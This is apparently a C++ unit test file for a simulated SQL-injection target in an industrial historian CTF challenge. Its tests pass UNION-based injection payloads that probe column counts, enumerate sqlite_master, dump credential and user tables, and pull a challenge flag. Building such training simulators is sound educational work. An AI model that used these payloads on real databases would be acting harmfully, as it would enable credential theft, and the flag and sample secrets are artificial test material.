// SPDX-License-Identifier: Apache-2.0
// Host tests for the OFFENSIVE Historian SQL-injection SIMULATOR (sim/HistSqlUnion) - the unscored
// V1-style Filter-by-Source discovery flow. This module is NOT SQLite; these tests pin the recognised
// injection shapes, the flag-only-via-UNION invariant, and output-buffer safety.
// Run: g++ -std=c++17 -I../source/ot ot_histsqlunion_tests.cpp ../source/ot/sim/HistSqlUnion.cpp && ./a.out
#include "sim/HistSqlUnion.h"

#include <cstdio>
#include <cstring>
#include <string>

using namespace ot;

namespace {
int g_pass = 0, g_fail = 0;
void fail(const char* f, int l, const char* e) { fprintf(stderr, "FAIL %s:%d: %s\n", f, l, e); g_fail++; }
}
#define CHECK(expr) do { if (expr) g_pass++; else fail(__FILE__, __LINE__, #expr); } while (0)

static std::string run(const char* src) {
    char out[2048];
    size_t n = sim::histsqlunion::evaluate(src, std::strlen(src), out, sizeof(out));
    // every result must be NUL-terminated exactly at n and never exceed the buffer
    CHECK(n < sizeof(out));
    CHECK(out[n] == '\0');
    return std::string(out, n);
}

static bool has(const std::string& s, const char* sub) { return s.find(sub) != std::string::npos; }

static long rowCount(const std::string& s) {
    auto k = s.find("\"rowCount\":");
    if (k == std::string::npos) return -1;
    return std::strtol(s.c_str() + k + 11, nullptr, 10);
}

// Valid JSON (for our bounded shape): balanced braces/brackets, terminates with '}'.
static bool wellFormed(const std::string& s) {
    if (s.empty() || s.back() != '}') return false;
    int brace = 0, brack = 0; bool inq = false;
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        if (inq) { if (c == '\\') i++; else if (c == '"') inq = false; continue; }
        if (c == '"') inq = true;
        else if (c == '{') brace++;
        else if (c == '}') brace--;
        else if (c == '[') brack++;
        else if (c == ']') brack--;
    }
    return brace == 0 && brack == 0 && !inq;
}

// 1. Ordinary (benign) source filter returns matching process_data rows, no error, no flag.
static void testBenign() {
    std::string r = run("intake");
    CHECK(!has(r, "\"error\":"));
    CHECK(has(r, "\"columns\":[\"id\",\"timestamp\",\"source\""));
    CHECK(rowCount(r) == 2);          // two 'intake' sample rows
    CHECK(has(r, "intake"));
    CHECK(!has(r, "flag{"));
    CHECK(wellFormed(r));
}

static void testBenignNoMatch() {
    std::string r = run("nope");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 0);
    CHECK(wellFormed(r));
}

// 2. A lone single quote -> unterminated-string error (the injectability tell).
static void testLoneQuote() {
    std::string r = run("'");
    CHECK(has(r, "\"error\":"));
    CHECK(has(r, "unrecognized token"));
    CHECK(rowCount(r) == 0);
    CHECK(wellFormed(r));
}

// A comment-terminated close ( value'-- ) is a valid benign filter, not an error.
static void testCommentClose() {
    std::string r = run("chemical'--");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 2);          // two 'chemical' rows
    CHECK(wellFormed(r));
}

// 3. UNION with the wrong column count fails with the column-count message.
static void testWrongColumnCount() {
    for (const char* p : {"' UNION SELECT 1 --",
                          "' UNION SELECT 1,2,3 --",
                          "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
                          "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 --"}) {
        std::string r = run(p);
        CHECK(has(r, "same number of result columns"));   // authentic SQLite wording
        CHECK(rowCount(r) == 0);
        CHECK(wellFormed(r));
    }
}

// 4. Correct column count (10) succeeds -> one literal row proving the count.
static void testCorrectColumnCount() {
    std::string r = run("' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 1);
    CHECK(has(r, "\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"10\""));
    CHECK(wellFormed(r));
}

// 5. Table enumeration via sqlite_master returns the expected simulated tables.
static void testEnumerateTables() {
    std::string r = run("zzz' UNION SELECT name,1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE type='table' --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 4);
    CHECK(has(r, "users"));
    CHECK(has(r, "process_data"));
    CHECK(has(r, "credentials"));
    CHECK(has(r, "flags"));
    CHECK(wellFormed(r));
}

// 6. Schema extraction returns that table's CREATE statement.
static void testSchema() {
    std::string r = run("zzz' UNION SELECT replace(sql,char(10),' '),1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE name='credentials' --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 1);
    CHECK(has(r, "CREATE TABLE credentials"));
    CHECK(has(r, "password"));
    CHECK(wellFormed(r));
}

// 7. Credentials extraction, incl. the host||':'||port concat idiom.
static void testCredentials() {
    std::string r = run("zzz' UNION SELECT service,host||':'||port,username,password,notes,1,1,1,1,1 FROM credentials --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 6);
    CHECK(has(r, "SCADA HMI"));
    CHECK(has(r, "10.0.3.10:8080"));     // concat idiom resolved
    CHECK(has(r, "scada_op!"));
    CHECK(has(r, "maint2024!"));
    CHECK(wellFormed(r));
}

// 8. Users extraction.
static void testUsers() {
    std::string r = run("zzz' UNION SELECT id,username,password,name,role,1,1,1,1,1 FROM users --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 2);
    CHECK(has(r, "hist_admin"));
    CHECK(has(r, "hist0ry!"));
    CHECK(wellFormed(r));
}

// 9. The flag is retrieved ONLY by a correct UNION against the flags table.
static void testFlagViaUnion() {
    std::string r = run("zzz' UNION SELECT id,flag,'3','4','5','6','7','8','9','10' FROM flags --");
    CHECK(!has(r, "\"error\":"));
    CHECK(rowCount(r) == 1);
    CHECK(has(r, "flag{sql1_1n_th3_h1st0r14n}"));
    CHECK(wellFormed(r));
}

// 10. The flag is NEVER emitted by anything else (benign queries, enumeration, other tables).
static void testFlagNotLeaked() {
    CHECK(!has(run("intake"), "flag{"));
    CHECK(!has(run(""), "flag{"));
    CHECK(!has(run("zzz' UNION SELECT name,1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE type='table' --"), "flag{"));
    CHECK(!has(run("zzz' UNION SELECT service,host,username,password,notes,1,1,1,1,1 FROM credentials --"), "flag{"));
    CHECK(!has(run("zzz' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --"), "flag{"));
}

// 11. Unknown table -> db-style error, no partial rows left behind.
static void testUnknownTable() {
    std::string r = run("zzz' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM secrets --");
    CHECK(has(r, "no such table: secrets"));
    CHECK(rowCount(r) == 0);
    CHECK(wellFormed(r));
}

// 12. Non-UNION injection tails are not evaluated (documented: no OR/boolean injection) -> syntax error.
static void testNonUnionTail() {
    std::string r = run("' OR 1=1 --");
    CHECK(has(r, "\"error\":"));
    CHECK(has(r, "syntax error"));
    CHECK(wellFormed(r));
}

// 13. Case-insensitive keywords.
static void testCaseInsensitive() {
    std::string r = run("zzz' union select id,flag,'3','4','5','6','7','8','9','10' from flags --");
    CHECK(rowCount(r) == 1);
    CHECK(has(r, "flag{sql1_1n_th3_h1st0r14n}"));
}

// 14. Malformed / adversarial inputs are handled safely (no crash, never overflow, valid JSON).
static void testMalformedSafe() {
    const char* bad[] = {
        "", "'''''", "' UNION", "' UNION SELECT", "' UNION SELECT FROM flags --",
        "' UNION SELECT ((((", "';;;--", "' union all select 1,2,3,4,5,6,7,8,9,10 from flags --",
        "' UNION SELECT a,b,c,d,e,f,g,h,i,j FROM sqlite_master WHERE name='nonexistent' --",
    };
    for (const char* b : bad) {
        char out[2048];
        size_t n = sim::histsqlunion::evaluate(b, std::strlen(b), out, sizeof(out));
        CHECK(n < sizeof(out));
        CHECK(out[n] == '\0');
        CHECK(wellFormed(std::string(out, n)));
    }
    // UNION ALL against flags (projecting the flag column) must still yield the flag.
    CHECK(has(run("' union all select id,flag,'3','4','5','6','7','8','9','10' from flags --"), "flag{sql1_1n_th3_h1st0r14n}"));
    // a WHERE name= with no matching table yields zero rows, not an error.
    std::string none = run("zzz' UNION SELECT name,1,1,1,1,1,1,1,1,1 FROM sqlite_master WHERE name='nope' --");
    CHECK(!has(none, "\"error\":"));
    CHECK(rowCount(none) == 0);
}

// 15. Output never exceeds a tiny buffer (truncates safely, stays NUL-terminated).
static void testTinyBuffer() {
    for (size_t cap = 1; cap <= 64; cap++) {
        char small[64];
        size_t n = sim::histsqlunion::evaluate(
            "zzz' UNION SELECT service,host||':'||port,username,password,notes,1,1,1,1,1 FROM credentials --",
            96, small, cap);
        CHECK(n < cap);
        CHECK(small[n] == '\0');
    }
}

int main() {
    testBenign();
    testBenignNoMatch();
    testLoneQuote();
    testCommentClose();
    testWrongColumnCount();
    testCorrectColumnCount();
    testEnumerateTables();
    testSchema();
    testCredentials();
    testUsers();
    testFlagViaUnion();
    testFlagNotLeaked();
    testUnknownTable();
    testNonUnionTail();
    testCaseInsensitive();
    testMalformedSafe();
    testTinyBuffer();
    printf("%d passed, %d failed\n", g_pass, g_fail);
    return g_fail ? 1 : 0;
}
